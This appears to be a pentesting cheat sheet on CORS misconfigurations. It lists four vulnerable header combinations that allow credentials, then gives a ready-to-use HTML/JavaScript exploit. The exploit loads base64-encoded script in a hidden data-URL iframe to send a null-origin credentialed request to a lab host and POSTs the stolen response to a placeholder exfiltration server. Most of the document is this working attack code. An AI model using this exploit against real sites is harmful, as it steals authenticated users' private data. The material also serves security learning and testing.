Case 1
`Access-Control-Allow-Origin: https://attacker.com`
`Access-Control-Allow-Credentials: True`

Case 2
`Access-Control-Allow-Origin: https://company.com.attacker.com`
`Access-Control-Allow-Credentials: True`

Case 3
`Access-Control-Allow-Origin: null`
`Access-Control-Allow-Credentials: True`

Case 4
`Access-Control-Allow-Origin: https://anysub.company.com`
`Access-Control-Allow-Credentials: True`

##### XSS + CORS 
```html
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
    <iframe id="exploitFrame" style="display:none;"></iframe>
    <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
  </div>

  <script>
    // JavaScript code for the exploit, adapted for inclusion in a data URL
    var exploitCode = `
      <script>
        function exploit() {
          var xhttp = new XMLHttpRequest();
          xhttp.open("GET", "http://corssop.thm/null.php", true);
          xhttp.withCredentials = true;
          xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              // Assuming you want to exfiltrate data to a controlled server
              var exfiltrate = function(data) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
                xhr.withCredentials = true;
                var body = data;
                var aBody = new Uint8Array(body.length);
                for (var i = 0; i < aBody.length; i++)
                  aBody[i] = body.charCodeAt(i);
                xhr.send(new Blob([aBody]));
              };
              exfiltrate(this.responseText);
            }
          };
          xhttp.send();
        }
        exploit();
      <\/script>
    `;

    // Encode the exploit code for use in a data URL
    var encodedExploit = btoa(exploitCode);

    // Set the iframe's src to the data URL containing the exploit
    document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
  </script>
```

>NOTICE:
- it’s a flaw once you can exploit it [example report](<- it’s a flaw once you can exploit it https://hackerone.com/reports/288912>)

